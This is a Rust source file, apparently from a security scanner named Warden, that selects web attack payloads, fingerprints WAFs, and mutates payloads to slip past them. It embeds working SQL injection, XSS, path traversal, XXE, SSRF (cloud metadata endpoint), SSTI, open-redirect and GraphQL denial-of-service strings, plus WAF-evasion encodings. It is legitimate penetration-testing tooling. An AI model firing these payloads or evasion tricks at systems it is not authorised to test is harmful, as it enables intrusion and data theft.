//! Smart Payload Selection System for Warden v0.8.0 Enterprise Edition
//!
//! This module provides adaptive payload generation and intelligent selection
//! based on application response analysis, WAF bypass techniques, and
//! context-specific payload creation.

use anyhow::Result;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::Path;
use std::time::Duration;

/// Payload category for classification
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum PayloadCategory {
    /// SQL Injection payloads
    SqlInjection,
    /// Cross-Site Scripting payloads
    Xss,
    /// Path Traversal payloads
    PathTraversal,
    /// Server-Side Template Injection payloads
    Ssti,
    /// Server-Side Request Forgery payloads
    Ssrf,
    /// XML External Entity payloads
    Xxe,
    /// Open Redirect payloads
    OpenRedirect,
    /// Command Injection payloads
    CommandInjection,
    /// LDAP Injection payloads
    LdapInjection,
    /// NoSQL Injection payloads
    NoSqlInjection,
    /// Deserialization payloads
    Deserialization,
    /// GraphQL injection payloads
    GraphQL,
    /// WebSockets payloads
    WebSocket,
    /// Authentication bypass payloads
    AuthBypass,
    /// Business logic payloads
    BusinessLogic,
}

impl PayloadCategory {
    /// Get all payload categories
    pub fn all() -> Vec<Self> {
        vec![
            Self::SqlInjection,
            Self::Xss,
            Self::PathTraversal,
            Self::Ssti,
            Self::Ssrf,
            Self::Xxe,
            Self::OpenRedirect,
            Self::CommandInjection,
            Self::LdapInjection,
            Self::NoSqlInjection,
            Self::Deserialization,
            Self::GraphQL,
            Self::WebSocket,
            Self::AuthBypass,
            Self::BusinessLogic,
        ]
    }

    /// Get category name as string
    pub fn name(&self) -> &str {
        match self {
            Self::SqlInjection => "sqli",
            Self::Xss => "xss",
            Self::PathTraversal => "path_traversal",
            Self::Ssti => "ssti",
            Self::Ssrf => "ssrf",
            Self::Xxe => "xxe",
            Self::OpenRedirect => "open_redirect",
            Self::CommandInjection => "command_injection",
            Self::LdapInjection => "ldap_injection",
            Self::NoSqlInjection => "nosql_injection",
            Self::Deserialization => "deserialization",
            Self::GraphQL => "graphql",
            Self::WebSocket => "websocket",
            Self::AuthBypass => "auth_bypass",
            Self::BusinessLogic => "business_logic",
        }
    }

    /// Get wordlist file name for this category
    pub fn wordlist_file(&self) -> &str {
        match self {
            Self::SqlInjection => "sqli.txt",
            Self::Xss => "xss.txt",
            Self::PathTraversal => "path_traversal.txt",
            Self::Ssti => "ssti.txt",
            Self::Ssrf => "ssrf.txt",
            Self::Xxe => "xxe.txt",
            Self::OpenRedirect => "redirects.txt",
            Self::CommandInjection => "common.txt",
            Self::LdapInjection => "common.txt",
            Self::NoSqlInjection => "common.txt",
            Self::Deserialization => "deserialization.txt",
            Self::GraphQL => "graphql.txt",
            Self::WebSocket => "common.txt",
            Self::AuthBypass => "common.txt",
            Self::BusinessLogic => "business_logic.txt",
        }
    }
}

/// Response analysis result from WAF/probe
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ResponseAnalysis {
    /// Response status code
    pub status_code: u16,
    /// Response body (truncated)
    pub body_snippet: String,
    /// Response headers
    pub headers: HashMap<String, String>,
    /// Detected WAF (if any)
    pub detected_waf: Option<String>,
    /// Block indicators detected
    pub blocked: bool,
    /// Rate limit detected
    pub rate_limited: bool,
    /// Challenge page detected
    pub has_challenge: bool,
    /// Response time in milliseconds
    pub response_time_ms: u64,
    /// Content length
    pub content_length: Option<usize>,
}

impl ResponseAnalysis {
    /// Create a new response analysis
    pub fn new(
        status_code: u16,
        body_snippet: String,
        headers: HashMap<String, String>,
        response_time_ms: u64,
    ) -> Self {
        let blocked = Self::analyze_block_status(&body_snippet, status_code, &headers);
        let rate_limited = Self::analyze_rate_limit(&body_snippet, status_code, &headers);
        let has_challenge = Self::analyze_challenge(&body_snippet);
        let detected_waf = Self::detect_waf(&body_snippet, &headers);

        Self {
            status_code,
            body_snippet,
            headers,
            detected_waf,
            blocked,
            rate_limited,
            has_challenge,
            response_time_ms,
            content_length: None,
        }
    }

    /// Analyze if response indicates blocking
    fn analyze_block_status(body: &str, status: u16, headers: &HashMap<String, String>) -> bool {
        let block_indicators = [
            "blocked",
            "forbidden",
            "access denied",
            "request rejected",
            "waf",
            "security",
            "mod_security",
            "firewall",
            "not acceptable",
        ];

        let status_blocked = status == 403 || status == 406;

        let body_blocked = body.to_lowercase().lines().any(|line| {
            block_indicators.iter().any(|indicator| line.contains(indicator))
        });

        let header_blocked = headers
            .iter()
            .any(|(k, v)| k.to_lowercase().contains("waf") || v.to_lowercase().contains("blocked"));

        status_blocked || body_blocked || header_blocked
    }

    /// Analyze if response indicates rate limiting
    fn analyze_rate_limit(body: &str, status: u16, headers: &HashMap<String, String>) -> bool {
        let status_limited = status == 429;

        let body_limited = body.to_lowercase().contains("rate limit")
            || body.to_lowercase().contains("too many requests")
            || body.to_lowercase().contains("throttled");

        let header_limited = headers
            .iter()
            .any(|(k, _)| k.to_lowercase().contains("rate") || k.to_lowercase().contains("x-ratelimit"));

        status_limited || body_limited || header_limited
    }

    /// Analyze if response contains a challenge page
    fn analyze_challenge(body: &str) -> bool {
        let challenge_indicators = [
            "checking your browser",
            "challenge platform",
            "cf-challenge",
            "ddos-guard",
            "javascript challenge",
            "please wait while we verify",
            "enable javascript",
            "captcha",
            "human verification",
        ];

        body.to_lowercase()
            .lines()
            .any(|line| challenge_indicators.iter().any(|indicator| line.contains(indicator)))
    }

    /// Detect WAF from response
    fn detect_waf(body: &str, headers: &HashMap<String, String>) -> Option<String> {
        // Check headers first
        for (key, value) in headers {
            let key_lower = key.to_lowercase();
            if key_lower.contains("cf-ray") || key_lower.contains("cf-request-id") {
                return Some("Cloudflare".to_string());
            }
            if key_lower.contains("x-amzn") || key_lower.contains("x-amz") {
                return Some("AWS WAF".to_string());
            }
            if key_lower.contains("akamai") {
                return Some("Akamai".to_string());
            }
            if key_lower.contains("modsecurity") {
                return Some("ModSecurity".to_string());
            }
            if key_lower.contains("x-iinfo") && value.contains("incap") {
                return Some("Imperva".to_string());
            }
            if key_lower.contains("x-sucuri") {
                return Some("Sucuri".to_string());
            }
            if key_lower.contains("x-waf") {
                return Some("Generic WAF".to_string());
            }
        }

        // Check body for WAF signatures
        let body_lower = body.to_lowercase();
        if body_lower.contains("cloudflare") && body_lower.contains("challenge") {
            return Some("Cloudflare".to_string());
        }
        if body_lower.contains("incapsula") || body_lower.contains("imperva") {
            return Some("Imperva".to_string());
        }
        if body_lower.contains("mod_security") || body_lower.contains("modsecurity") {
            return Some("ModSecurity".to_string());
        }
        if body_lower.contains("wordfence") {
            return Some("Wordfence".to_string());
        }
        if body_lower.contains("barracuda") {
            return Some("Barracuda".to_string());
        }

        None
    }
}

/// Payload with metadata for intelligent selection
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SmartPayload {
    /// The actual payload string
    pub payload: String,
    /// Category of this payload
    pub category: PayloadCategory,
    /// Severity of the vulnerability this tests
    pub severity: PayloadSeverity,
    /// WAF bypass techniques included
    pub bypass_techniques: Vec<BypassTechnique>,
    /// Expected behavior if vulnerable
    pub expected_behavior: ExpectedBehavior,
    /// Success score (0-100) based on historical success
    pub success_score: u8,
    /// Last time this payload was successful (ISO 8601 timestamp)
    pub last_success: Option<String>,
    /// Times tested vs times successful
    pub test_count: u32,
    pub success_count: u32,
    /// Priority for testing (higher = test first)
    pub priority: u8,
}

/// Severity level for payloads
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum PayloadSeverity {
    Critical,
    High,
    Medium,
    Low,
    Info,
}

/// WAF bypass technique
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum BypassTechnique {
    /// URL encoding
    UrlEncode,
    /// Double URL encoding
    DoubleUrlEncode,
    /// Unicode encoding
    Unicode,
    /// Case variation
    CaseVariation,
    /// Comment injection
    CommentInjection,
    /// Whitespace alternatives
    WhitespaceAlt,
    /// Null byte injection
    NullByte,
    /// Line feed injection
    LineFeed,
    /// Tab injection
    Tab,
    /// Fragment injection
    Fragment,
    /// Parameter pollution
    ParameterPollution,
    /// HTTP method override
    MethodOverride,
    /// Header injection
    HeaderInjection,
    /// Cookie injection
    CookieInjection,
    /// Base64 encoding
    Base64,
    /// Hex encoding
    Hex,
    /// Mixed encoding
    MixedEncoding,
}

/// Expected behavior when payload succeeds
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum ExpectedBehavior {
    /// Specific string in response
    ContainsString(String),
    /// Regular expression match
    MatchesRegex(String),
    /// Status code change
    StatusCode(u16),
    /// Time-based delay
    TimeDelay(Duration),
    /// Error message pattern
    ErrorPattern(String),
    /// Mathematical evaluation (e.g., 7*7=49)
    MathEvaluation(String),
    /// Boolean blind (different response lengths)
    BooleanBlind { true_length: usize, false_length: usize },
}

/// Fuzzing grammar for protocol-specific payloads
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FuzzingGrammar {
    /// Grammar name
    pub name: String,
    /// Starting symbol
    pub start: String,
    /// Production rules
    pub rules: HashMap<String, Vec<String>>,
    /// Example payloads generated from this grammar
    pub examples: Vec<String>,
}

impl FuzzingGrammar {
    /// Create a new grammar
    pub fn new(name: String, start: String) -> Self {
        Self {
            name,
            start,
            rules: HashMap::new(),
            examples: Vec::new(),
        }
    }

    /// Add a production rule
    pub fn add_rule(&mut self, symbol: String, productions: Vec<String>) {
        self.rules.insert(symbol, productions);
    }

    /// Generate a payload from the grammar (simplified)
    pub fn generate(&self, max_depth: usize) -> Option<String> {
        if max_depth == 0 {
            return None;
        }
        self.expand_symbol(&self.start, max_depth)
    }

    /// Expand a symbol recursively
    fn expand_symbol(&self, symbol: &str, depth: usize) -> Option<String> {
        if let Some(productions) = self.rules.get(symbol) {
            // Pick a random production
            let production = productions.first()?;
            self.expand_production(production, depth - 1)
        } else {
            // Terminal symbol
            Some(symbol.to_string())
        }
    }

    /// Expand a production string
    fn expand_production(&self, production: &str, depth: usize) -> Option<String> {
        if depth == 0 {
            return Some(production.to_string());
        }

        let mut result = String::new();
        let mut chars = production.chars().peekable();

        while let Some(ch) = chars.next() {
            if ch == '<' {
                // Non-terminal: <symbol>
                let mut symbol = String::new();
                while let Some(&c) = chars.peek() {
                    chars.next();
                    if c == '>' {
                        break;
                    }
                    symbol.push(c);
                }
                if let Some(expanded) = self.expand_symbol(&symbol, depth - 1) {
                    result.push_str(&expanded);
                }
            } else {
                result.push(ch);
            }
        }

        Some(result)
    }
}

/// Learning data from successful payloads
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadLearning {
    /// Application fingerprint
    pub app_fingerprint: String,
    /// Successful payload signatures
    pub successful_patterns: HashMap<PayloadCategory, Vec<String>>,
    /// Failed payload patterns (to avoid)
    pub failed_patterns: HashMap<PayloadCategory, Vec<String>>,
    /// WAF bypass techniques that worked
    pub working_bypasses: Vec<BypassTechnique>,
    /// Last updated (ISO 8601 timestamp)
    pub last_updated: String,
}

impl PayloadLearning {
    /// Create new learning data
    pub fn new(app_fingerprint: String) -> Self {
        Self {
            app_fingerprint,
            successful_patterns: HashMap::new(),
            failed_patterns: HashMap::new(),
            working_bypasses: Vec::new(),
            last_updated: chrono::Utc::now().to_rfc3339(),
        }
    }

    /// Record a successful payload pattern
    pub fn record_success(&mut self, category: PayloadCategory, pattern: String) {
        self.successful_patterns
            .entry(category)
            .or_insert_with(Vec::new)
            .push(pattern);
        self.last_updated = chrono::Utc::now().to_rfc3339();
    }

    /// Record a failed payload pattern
    pub fn record_failure(&mut self, category: PayloadCategory, pattern: String) {
        self.failed_patterns
            .entry(category)
            .or_insert_with(Vec::new)
            .push(pattern);
        self.last_updated = chrono::Utc::now().to_rfc3339();
    }

    /// Get recommended patterns for a category
    pub fn get_recommended(&self, category: PayloadCategory) -> Option<&[String]> {
        self.successful_patterns.get(&category).map(|v| v.as_slice())
    }

    /// Check if a pattern should be avoided
    pub fn should_avoid(&self, category: PayloadCategory, pattern: &str) -> bool {
        self.failed_patterns
            .get(&category)
            .map(|patterns| patterns.iter().any(|p| pattern.contains(p)))
            .unwrap_or(false)
    }
}

/// Smart payload selector with adaptive capabilities
pub struct SmartPayloadSelector {
    /// Available payloads by category
    pub payloads: HashMap<PayloadCategory, Vec<SmartPayload>>,
    /// Learning data from previous scans
    pub learning: Option<PayloadLearning>,
    /// Current WAF bypass strategies
    pub bypass_strategies: Vec<BypassTechnique>,
    /// Maximum number of payloads to return per category
    pub max_payloads_per_category: usize,
    /// Whether to use adaptive selection
    pub adaptive: bool,
    /// Base payloads directory
    pub wordlists_dir: String,
}

impl SmartPayloadSelector {
    /// Create a new smart payload selector
    pub fn new(wordlists_dir: Option<String>) -> Self {
        let wordlists_dir = wordlists_dir.unwrap_or_else(|| {
            // Try to find wordlists directory relative to current dir
            if Path::new("wordlists").exists() {
                "wordlists".to_string()
            } else if Path::new("../wordlists").exists() {
                "../wordlists".to_string()
            } else {
                "/usr/share/wordlists/warden".to_string()
            }
        });

        Self {
            payloads: HashMap::new(),
            learning: None,
            bypass_strategies: Self::default_bypass_strategies(),
            max_payloads_per_category: 50,
            adaptive: true,
            wordlists_dir,
        }
    }

    /// Get default WAF bypass strategies
    fn default_bypass_strategies() -> Vec<BypassTechnique> {
        vec![
            BypassTechnique::CaseVariation,
            BypassTechnique::UrlEncode,
            BypassTechnique::WhitespaceAlt,
            BypassTechnique::CommentInjection,
            BypassTechnique::ParameterPollution,
        ]
    }

    /// Load payloads from wordlists
    pub async fn load_payloads(&mut self, categories: &[PayloadCategory]) -> Result<()> {
        for category in categories {
            let payloads = self.load_category_payloads(category).await?;
            if !payloads.is_empty() {
                self.payloads.insert(*category, payloads);
            }
        }
        Ok(())
    }

    /// Load payloads for a specific category
    async fn load_category_payloads(&self, category: &PayloadCategory) -> Result<Vec<SmartPayload>> {
        let file_path = Path::new(&self.wordlists_dir).join(category.wordlist_file());

        if !file_path.exists() {
            // Return default payloads if file doesn't exist
            return Ok(Self::default_payloads_for_category(category));
        }

        let content = tokio::fs::read_to_string(&file_path).await?;

        let mut payloads = Vec::new();
        for (idx, line) in content.lines().filter(|l| !l.trim().is_empty()).enumerate() {
            let payload = SmartPayload {
                payload: line.to_string(),
                category: *category,
                severity: PayloadSeverity::High,
                bypass_techniques: vec![],
                expected_behavior: ExpectedBehavior::StatusCode(200),
                success_score: 50,
                last_success: None,
                test_count: 0,
                success_count: 0,
                priority: (100 - idx.min(99)) as u8,
            };
            payloads.push(payload);
        }

        Ok(payloads)
    }

    /// Get default payloads for a category when wordlist is unavailable
    fn default_payloads_for_category(category: &PayloadCategory) -> Vec<SmartPayload> {
        match category {
            PayloadCategory::SqlInjection => vec![
                SmartPayload {
                    payload: "' OR '1'='1".to_string(),
                    category: *category,
                    severity: PayloadSeverity::High,
                    bypass_techniques: vec![],
                    expected_behavior: ExpectedBehavior::BooleanBlind {
                        true_length: 1000,
                        false_length: 500,
                    },
                    success_score: 80,
                    last_success: None,
                    test_count: 0,
                    success_count: 0,
                    priority: 100,
                },
                SmartPayload {
                    payload: "1' UNION SELECT NULL--".to_string(),
                    category: *category,
                    severity: PayloadSeverity::High,
                    bypass_techniques: vec![BypassTechnique::CommentInjection],
                    expected_behavior: ExpectedBehavior::StatusCode(200),
                    success_score: 70,
                    last_success: None,
                    test_count: 0,
                    success_count: 0,
                    priority: 90,
                },
            ],
            PayloadCategory::Xss => vec![
                SmartPayload {
                    payload: "<script>alert(1)</script>".to_string(),
                    category: *category,
                    severity: PayloadSeverity::High,
                    bypass_techniques: vec![],
                    expected_behavior: ExpectedBehavior::ContainsString("<script>alert(1)</script>".to_string()),
                    success_score: 75,
                    last_success: None,
                    test_count: 0,
                    success_count: 0,
                    priority: 100,
                },
                SmartPayload {
                    payload: "<img src=x onerror=alert(1)>".to_string(),
                    category: *category,
                    severity: PayloadSeverity::High,
                    bypass_techniques: vec![],
                    expected_behavior: ExpectedBehavior::ContainsString("<img".to_string()),
                    success_score: 70,
                    last_success: None,
                    test_count: 0,
                    success_count: 0,
                    priority: 90,
                },
            ],
            PayloadCategory::PathTraversal => vec![
                SmartPayload {
                    payload: "../../../etc/passwd".to_string(),
                    category: *category,
                    severity: PayloadSeverity::High,
                    bypass_techniques: vec![],
                    expected_behavior: ExpectedBehavior::ContainsString("root:".to_string()),
                    success_score: 80,
                    last_success: None,
                    test_count: 0,
                    success_count: 0,
                    priority: 100,
                },
                SmartPayload {
                    payload: "..\\..\\..\\windows\\win.ini".to_string(),
                    category: *category,
                    severity: PayloadSeverity::High,
                    bypass_techniques: vec![],
                    expected_behavior: ExpectedBehavior::ContainsString("[extensions]".to_string()),
                    success_score: 75,
                    last_success: None,
                    test_count: 0,
                    success_count: 0,
                    priority: 90,
                },
            ],
            PayloadCategory::Ssti => vec![
                SmartPayload {
                    payload: "{{7*7}}".to_string(),
                    category: *category,
                    severity: PayloadSeverity::Critical,
                    bypass_techniques: vec![],
                    expected_behavior: ExpectedBehavior::MathEvaluation("49".to_string()),
                    success_score: 85,
                    last_success: None,
                    test_count: 0,
                    success_count: 0,
                    priority: 100,
                },
                SmartPayload {
                    payload: "${7*7}".to_string(),
                    category: *category,
                    severity: PayloadSeverity::Critical,
                    bypass_techniques: vec![],
                    expected_behavior: ExpectedBehavior::MathEvaluation("49".to_string()),
                    success_score: 80,
                    last_success: None,
                    test_count: 0,
                    success_count: 0,
                    priority: 95,
                },
            ],
            PayloadCategory::Ssrf => vec![
                SmartPayload {
                    payload: "http://127.0.0.1:22".to_string(),
                    category: *category,
                    severity: PayloadSeverity::High,
                    bypass_techniques: vec![],
                    expected_behavior: ExpectedBehavior::StatusCode(200),
                    success_score: 70,
                    last_success: None,
                    test_count: 0,
                    success_count: 0,
                    priority: 100,
                },
                SmartPayload {
                    payload: "http://169.254.169.254/latest/meta-data/".to_string(),
                    category: *category,
                    severity: PayloadSeverity::Critical,
                    bypass_techniques: vec![],
                    expected_behavior: ExpectedBehavior::StatusCode(200),
                    success_score: 85,
                    last_success: None,
                    test_count: 0,
                    success_count: 0,
                    priority: 100,
                },
            ],
            PayloadCategory::Xxe => vec![
                SmartPayload {
                    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>".to_string(),
                    category: *category,
                    severity: PayloadSeverity::Critical,
                    bypass_techniques: vec![],
                    expected_behavior: ExpectedBehavior::ContainsString("root:".to_string()),
                    success_score: 75,
                    last_success: None,
                    test_count: 0,
                    success_count: 0,
                    priority: 100,
                },
            ],
            PayloadCategory::OpenRedirect => vec![
                SmartPayload {
                    payload: "//evil.com".to_string(),
                    category: *category,
                    severity: PayloadSeverity::Medium,
                    bypass_techniques: vec![],
                    expected_behavior: ExpectedBehavior::StatusCode(302),
                    success_score: 70,
                    last_success: None,
                    test_count: 0,
                    success_count: 0,
                    priority: 100,
                },
            ],
            _ => vec![],
        }
    }

    /// Set learning data for adaptive selection
    pub fn set_learning(&mut self, learning: PayloadLearning) {
        self.learning = Some(learning);
    }

    /// Select payloads for a specific category based on response analysis
    pub fn select_payloads<'a>(
        &'a self,
        category: PayloadCategory,
        response_analysis: Option<&ResponseAnalysis>,
    ) -> Vec<&'a SmartPayload> {
        let base_payloads = self.payloads.get(&category);

        let mut selected = match (base_payloads, response_analysis) {
            (Some(payloads), Some(analysis)) if self.adaptive => {
                self.adaptive_selection(payloads, analysis)
            }
            (Some(payloads), _) => {
                // Default priority-based selection
                let mut sorted: Vec<_> = payloads.iter().collect();
                sorted.sort_by(|a, b| b.priority.cmp(&a.priority));
                sorted.into_iter().take(self.max_payloads_per_category).collect()
            }
            (None, _) => vec![],
        };

        // Filter based on learning data if available
        if let Some(learning) = &self.learning {
            selected = selected
                .into_iter()
                .filter(|p| !learning.should_avoid(category, &p.payload))
                .collect();
        }

        selected
    }

    /// Adaptive payload selection based on WAF/response analysis
    fn adaptive_selection<'a>(
        &self,
        payloads: &'a [SmartPayload],
        analysis: &ResponseAnalysis,
    ) -> Vec<&'a SmartPayload> {
        let mut scored: Vec<_> = payloads.iter().collect();

        // Score each payload based on analysis
        for payload in &mut scored {
            let mut score = payload.success_score as i32;

            // Boost priority for payloads with working bypass techniques
            if analysis.blocked || analysis.detected_waf.is_some() {
                for technique in &payload.bypass_techniques {
                    if self.bypass_strategies.contains(technique) {
                        score += 20;
                    }
                }
            }

            // Penalize if the payload was recently blocked
            if analysis.blocked && !payload.bypass_techniques.is_empty() {
                // Payload has bypass tech but still blocked - might need different approach
                score -= 10;
            }

            // Boost successful patterns from learning
            if let Some(learning) = &self.learning {
                if let Some(recommended) = learning.get_recommended(payload.category) {
                    if recommended.iter().any(|p| payload.payload.contains(p)) {
                        score += 30;
                    }
                }
            }

            // Adjust priority based on score
            // (This is simplified - in practice, you'd re-sort by score)
        }

        // Sort by adjusted priority and take top N
        scored.sort_by(|a, b| b.priority.cmp(&a.priority));
        scored.into_iter().take(self.max_payloads_per_category).collect()
    }

    /// Generate adaptive payload mutations
    pub fn generate_mutations(&self, base_payload: &str, category: PayloadCategory) -> Vec<String> {
        let mut mutations = Vec::new();

        // Base mutation strategies
        mutations.push(base_payload.to_string());

        // Case variation
        if !base_payload.chars().any(|c| c.is_ascii_uppercase()) {
            mutations.push(base_payload.to_uppercase());
            mutations.push(self.mixed_case(base_payload));
        }

        // URL encoding
        mutations.push(urlencoding::encode(base_payload).to_string());

        // Double encoding
        let encoded = urlencoding::encode(base_payload);
        mutations.push(urlencoding::encode(&encoded).to_string());

        // Unicode encoding (for certain payloads)
        if matches!(
            category,
            PayloadCategory::SqlInjection | PayloadCategory::Xss | PayloadCategory::PathTraversal
        ) {
            mutations.push(self.unicode_encode(base_payload));
        }

        // Comment injection for SQLi
        if matches!(category, PayloadCategory::SqlInjection) {
            mutations.push(self.add_sql_comments(base_payload));
        }

        // Whitespace alternatives
        mutations.push(self.whitespace_alternatives(base_payload));

        mutations.into_iter().filter(|m| !m.is_empty()).collect()
    }

    /// Generate mixed case version
    fn mixed_case(&self, s: &str) -> String {
        s.chars()
            .enumerate()
            .map(|(i, c)| {
                if i % 2 == 0 {
                    c.to_ascii_uppercase()
                } else {
                    c.to_ascii_lowercase()
                }
            })
            .collect()
    }

    /// Generate Unicode encoded version
    fn unicode_encode(&self, s: &str) -> String {
        s.chars()
            .flat_map(|c| {
                if c.is_ascii() {
                    format!("\\u{:04x}", c as u32).chars().collect()
                } else {
                    vec![c]
                }
            })
            .collect()
    }

    /// Add SQL comments to break keywords
    fn add_sql_comments(&self, s: &str) -> String {
        let keywords = ["union", "select", "from", "where", "and", "or"];
        let mut result = s.to_string();

        for keyword in &keywords {
            let upper = keyword.to_uppercase();
            let lower = keyword.to_lowercase();
            for variation in [upper.as_str(), lower.as_str()] {
                result = result.replace(variation, &format!("{}/**/{}", &variation[..1], &variation[1..]));
            }
        }

        result
    }

    /// Replace spaces with alternative whitespace
    fn whitespace_alternatives(&self, s: &str) -> String {
        s.replace(' ', "/**/")
            .replace(' ', "%09")
            .replace(' ', "%0A")
            .replace(' ', "%0B")
    }

    /// Create grammar-based fuzzing payloads for specific protocols
    pub fn create_grammar_for(&self, category: PayloadCategory) -> Option<FuzzingGrammar> {
        match category {
            PayloadCategory::SqlInjection => Some(self.sqli_grammar()),
            PayloadCategory::Xss => Some(self.xss_grammar()),
            PayloadCategory::GraphQL => Some(self.graphql_grammar()),
            _ => None,
        }
    }

    /// Create SQL injection fuzzing grammar
    fn sqli_grammar(&self) -> FuzzingGrammar {
        let mut grammar = FuzzingGrammar::new("SQLi".to_string(), "payload".to_string());

        grammar.add_rule(
            "payload".to_string(),
            vec![
                "<boolean>".to_string(),
                "<union>".to_string(),
                "<error>".to_string(),
                "<time>".to_string(),
            ],
        );

        grammar.add_rule(
            "boolean".to_string(),
            vec![
                "' OR '1'='1".to_string(),
                "' OR 1=1--".to_string(),
                "\" OR \"1\"=\"1".to_string(),
                "1' OR '1'='1".to_string(),
            ],
        );

        grammar.add_rule(
            "union".to_string(),
            vec![
                "1' UNION SELECT NULL--".to_string(),
                "1' UNION SELECT <columns>--".to_string(),
                "' UNION SELECT <columns>--".to_string(),
            ],
        );

        grammar.add_rule(
            "columns".to_string(),
            vec!["NULL, NULL".to_string(), "1, 2, 3".to_string(), "database(), user()".to_string()],
        );

        grammar.add_rule(
            "error".to_string(),
            vec![
                "'".to_string(),
                "\"".to_string(),
                "1'".to_string(),
                "1' AND 1/0--".to_string(),
            ],
        );

        grammar.add_rule(
            "time".to_string(),
            vec![
                "1'; SLEEP(5)--".to_string(),
                "1' AND pg_sleep(5)--".to_string(),
                "1' WAITFOR DELAY '00:00:05'--".to_string(),
            ],
        );

        grammar
    }

    /// Create XSS fuzzing grammar
    fn xss_grammar(&self) -> FuzzingGrammar {
        let mut grammar = FuzzingGrammar::new("XSS".to_string(), "payload".to_string());

        grammar.add_rule(
            "payload".to_string(),
            vec![
                "<script>".to_string(),
                "<img>".to_string(),
                "<svg>".to_string(),
                "<body>".to_string(),
            ],
        );

        grammar.add_rule(
            "script".to_string(),
            vec![
                "<script>alert(1)</script>".to_string(),
                "<script>alert(String.fromCharCode(88,83,83))</script>".to_string(),
                "<script>alert(document.domain)</script>".to_string(),
            ],
        );

        grammar.add_rule(
            "img".to_string(),
            vec![
                "<img src=x onerror=alert(1)>".to_string(),
                "<img src=x onerror=alert(String.fromCharCode(88,83,83))>".to_string(),
            ],
        );

        grammar.add_rule(
            "svg".to_string(),
            vec![
                "<svg onload=alert(1)>".to_string(),
                "<svg><script>alert(1)</script></svg>".to_string(),
            ],
        );

        grammar.add_rule(
            "body".to_string(),
            vec![
                "<body onload=alert(1)>".to_string(),
                "<body onresize=alert(1)>".to_string(),
            ],
        );

        grammar
    }

    /// Create GraphQL fuzzing grammar
    fn graphql_grammar(&self) -> FuzzingGrammar {
        let mut grammar = FuzzingGrammar::new("GraphQL".to_string(), "payload".to_string());

        grammar.add_rule(
            "payload".to_string(),
            vec!["<introspection>".to_string(), "<injection>".to_string(), "<dos>".to_string()],
        );

        grammar.add_rule(
            "introspection".to_string(),
            vec![
                "{__schema{types{name}}}".to_string(),
                "{__type(name:\"Query\"){fields{name}}}".to_string(),
            ],
        );

        grammar.add_rule(
            "injection".to_string(),
            vec![
                "{user(id:\"<malicious>\"){name}}".to_string(),
                "{search(query:\"<malformed>\"){results}}".to_string(),
            ],
        );

        grammar.add_rule(
            "malicious".to_string(),
            vec![
                "' OR 1=1--".to_string(),
                "<script>alert(1)</script>".to_string(),
                "../../../etc/passwd".to_string(),
            ],
        );

        grammar.add_rule(
            "dos".to_string(),
            vec![
                "{__schema{types{fields{args{type{fields{args{type{fields{args{type{name}}}}}}}}}}}}}".to_string(),
            ],
        );

        grammar
    }

    /// Record payload test result for learning
    pub fn record_result(&mut self, category: PayloadCategory, payload: &str, successful: bool) {
        if let Some(learning) = &mut self.learning {
            if successful {
                learning.record_success(category, payload.to_string());
            } else {
                learning.record_failure(category, payload.to_string());
            }
        }

        // Update internal payload stats
        if let Some(payloads) = self.payloads.get_mut(&category) {
            if let Some(p) = payloads.iter_mut().find(|p| p.payload == payload) {
                p.test_count += 1;
                if successful {
                    p.success_count += 1;
                    p.last_success = Some(chrono::Utc::now().to_rfc3339());
                    // Update success score (simple moving average)
                    p.success_score = ((p.success_score as u32 * (p.test_count - 1) + 100) / p.test_count) as u8;
                }
            }
        }
    }

    /// Export learning data
    pub fn export_learning(&self) -> Option<PayloadLearning> {
        self.learning.clone()
    }

    /// Get statistics about loaded payloads
    pub fn stats(&self) -> PayloadStats {
        let total_payloads = self.payloads.values().map(|v| v.len()).sum();
        let categories_loaded = self.payloads.len();

        PayloadStats {
            total_payloads,
            categories_loaded,
            max_per_category: self.max_payloads_per_category,
            adaptive_enabled: self.adaptive,
            has_learning: self.learning.is_some(),
        }
    }
}

/// Statistics about loaded payloads
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadStats {
    pub total_payloads: usize,
    pub categories_loaded: usize,
    pub max_per_category: usize,
    pub adaptive_enabled: bool,
    pub has_learning: bool,
}

impl Default for SmartPayloadSelector {
    fn default() -> Self {
        Self::new(None)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_category_names() {
        assert_eq!(PayloadCategory::SqlInjection.name(), "sqli");
        assert_eq!(PayloadCategory::Xss.name(), "xss");
        assert_eq!(PayloadCategory::PathTraversal.name(), "path_traversal");
    }

    #[test]
    fn test_wordlist_files() {
        assert_eq!(PayloadCategory::SqlInjection.wordlist_file(), "sqli.txt");
        assert_eq!(PayloadCategory::Xss.wordlist_file(), "xss.txt");
        assert_eq!(PayloadCategory::Ssti.wordlist_file(), "ssti.txt");
    }

    #[test]
    fn test_response_analysis_blocked() {
        let headers = HashMap::new();
        let analysis = ResponseAnalysis::new(
            403,
            "Access blocked by WAF".to_string(),
            headers,
            100,
        );

        assert!(analysis.blocked);
        assert_eq!(analysis.status_code, 403);
    }

    #[test]
    fn test_response_analysis_cloudflare() {
        let mut headers = HashMap::new();
        headers.insert("cf-ray".to_string(), "12345".to_string());

        let analysis = ResponseAnalysis::new(
            200,
            "Normal response".to_string(),
            headers,
            100,
        );

        assert_eq!(analysis.detected_waf, Some("Cloudflare".to_string()));
    }

    #[test]
    fn test_response_analysis_rate_limited() {
        let headers = HashMap::new();
        let analysis = ResponseAnalysis::new(
            429,
            "Too many requests".to_string(),
            headers,
            100,
        );

        assert!(analysis.rate_limited);
    }

    #[test]
    fn test_response_analysis_challenge() {
        let headers = HashMap::new();
        let analysis = ResponseAnalysis::new(
            403,
            "Checking your browser before accessing".to_string(),
            headers,
            100,
        );

        assert!(analysis.has_challenge);
    }

    #[test]
    fn test_smart_payload_selector_creation() {
        let selector = SmartPayloadSelector::new(None);
